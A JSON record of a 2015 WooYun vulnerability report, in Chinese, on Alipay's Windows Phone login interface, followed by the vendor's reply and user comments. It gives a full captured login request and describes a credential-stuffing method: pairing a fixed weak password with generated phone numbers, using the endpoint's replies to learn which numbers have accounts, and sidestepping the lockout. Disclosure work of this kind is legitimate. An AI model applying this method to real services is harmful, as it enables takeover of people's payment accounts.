{"id": 45886, "wybug_id": "wooyun-2015-093613", "wybug_title": "阿里巴巴某登录接口设计不当撞裤没商量", "wybug_corp": "阿里巴巴", "wybug_author": "MeirLin", "wybug_date": "2015-01-24 17:23", "wybug_open_date": "2015-03-10 17:24", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-10：\t细节向公众公开  简要描述： 针对拥有大量用户资源的厂商这种撞裤越有危害。撞裤是一场需要用户参与的持久战，这种漏洞还是公开了比较好，让用户安全意识的重要性。所以就没向ASRC提交 :-) 详细说明：  问题出在WindowsPhone移动端的支付宝钱包，登录没有限制（如验证码之类的）接着我们抓他的登录包\n\n我们可以看到登录帐号是明文显示在包中的，而包我们可以随意更改，也就是说我们可以随意更改尝试登录的帐号，不过这里可以看到密码部分是加密过的，想要知道算法恐怕得去逆向程序了，但是我们目的是撞裤，可以保持密码部分不变来批量撞帐号，使用弱密码依然用猪猪侠发的弱密码TOP100中的top6首先构造包\nPOST https://mobilegw.alipay.com/mgw.htm HTTP/1.1Accept: */*Content-Length: 1104Accept-Encoding: identitydid: dCLcmB/mO88BAWz2oVqhLlsCclientId: 8d19c072a4productId: WINPHONE_2NDCookie: zone=GZ00B;Domain=.alipay.com;Path=/,path=/Content-Type: application/x-www-form-urlencoded;charset=UTF-8User-Agent: NativeHostHost: mobilegw.alipay.comConnection: Keep-AliveCache-Control: no-cache\n\noperationType=alipay.user.login&requestData=[{\"loginId\":\"1588888888\",\"loginType\":\"alipay\",\"loginWthPwd\":\"withpwd\",\"loginPassword\":\"p%2FzZD0Ppk%2FzQPItvn7snMMV%2FmVSlnhcaphtX6XRspjnuNC8gYZ6eEEJLHIfS8XMo%2BwUjFUTnqgKkzyJp%2FLYU66VtvAwVcsLeW7XomyAg7VKq%2FLevUHFlaUx3GlS0o%2FDfZ%2FOOTVjrKkfRIOSoefAo6JLUqVQAnl8uYHQ%2FmgMz67g%3D\",\"loginCheckCode\":\"\",\"tbCheckCodeId\":null,\"tbCheckCode\":null,\"productId\":\"WINPHONE_2ND\",\"productVersion\":\"8.2.1.0806\",\"osVersion\":\"3051.50009.1424.0002\",\"userAgent\":\"0.5.0.1\",\"channels\":\"wpstore\",\"clientDigest\":null,\"secTS\":\"2020878325\",\"deviceToken\":null,\"screenWidth\":\"480\",\"screenHigh\":\"800\",\"clientId\":\"464240418101466|314875527246815\",\"walletTid\":\"61059d609a482248c67be9cb0bccb90c0ec9da25a1be557aaf2c4d5f0c1b9bf3\",\"walletClientKey\":\"464240418101466|314875527246815\",\"mspTid\":\"61059d609a482248c67be9cb0bccb90c0ec9da25a1be557aaf2c4d5f0c1b9bf3\",\"mspImsi\":\"464240418101466\",\"mspImei\":\"314875527246815\",\"mspClientKey\":\"8d19c072a4\",\"sourceId\":null,\"mac\":\"\",\"cellId\":null,\"location\":null,\"vimsi\":\"464240418101466\",\"vimei\":\"314875527246815\",\"externParams\":null,\"operatorType\":null}]\n哎呀，把我设备的各种信息都泄漏了，不过无所谓.. 在这个互联网谁还会有隐私呢 ?这里加密的密码部分明文应该是“woaini1314”那我们针对这个弱密码就可以批量撞帐号了，所以用户数量越大的厂商这类的撞裤命中率越高，弱密码可没办法防止，所以说撞裤漏洞是一场需要用户参与的持久战。但是呢，大量的帐号哪里弄? 这很简单呀在登录的时候，在帐号处填写的手机号如果没有绑定支付宝的话就会显示“该账户不存在”，如果一个帐号存在的话我们尝试登录就会显示“密码输入错误”然后用字典工具生成11位的数字组合，前3位是号段，所以只要生成后8位就可以了\n\n\n\n那我们把上个测试迅雷撞裤的脚本稍微修改一下就能拿来用了\n\n如果有跑出来成功的就会保存在good.txt，为了节省时间我并没有真的去测试大量帐号，只是测试了我自己的帐号是否能成功，我把自己的支付宝密码改为了woaini1314，然后添加到usernames.txt，\n\n看看会不会被撞到，结果是成功撞到的。\n\n所以呢，针对这个弱密码还是可以撞到一部分用户的 。。   漏洞证明：  \n\n\n\n其实阿里也是有措施防止撞裤的，每个帐号密码尝试次数为5次，如果错误五次就会锁定3小时但是我这里撞裤是针对密码来撞的，如果密码不正确就直接过了，所以只会尝试一遍..也就巧妙绕过了这个防护措施   修复方案：  移动端和Web端同样重要   版权声明：转载请注明来源 MeirLin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2015-01-26 19:53 厂商回复： 属于已知漏洞，感谢您对阿里巴巴安全的关注！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-24 17:51 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  更改了一下标题@xsser    \n     2015-01-26 20:12 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  哈哈，我报ASRC那个和这个不是同一个接口,不过方法是一样的。但是那个却是忽略的，为什么在乌云就确认了 在ASRC就给忽略呢 .. 既然不认为是漏洞乌云也应该忽略呀  @xsser  @疯狗     \n     2015-01-26 21:15 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @MeirLin 说得很有道理    \n     2015-01-26 22:42 |    \t\t夏殇 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:21        | 不忘初心，方得始终。)\t\t \n  我竟无言以对    \n     2015-01-26 22:45 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  @zeracker 漏洞是先提交的乌云，随后测试又发现一处(甚至密码明文)然后就报ASRC了 .. asrc那个审核的早 下午的时候就忽略了，晚上乌云这个给确认了，还说属于已知漏洞 ...其实这漏洞我就没打算会被确认 就想让用户知道弱密码危害有多大 这问题是厂商解决不了的    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}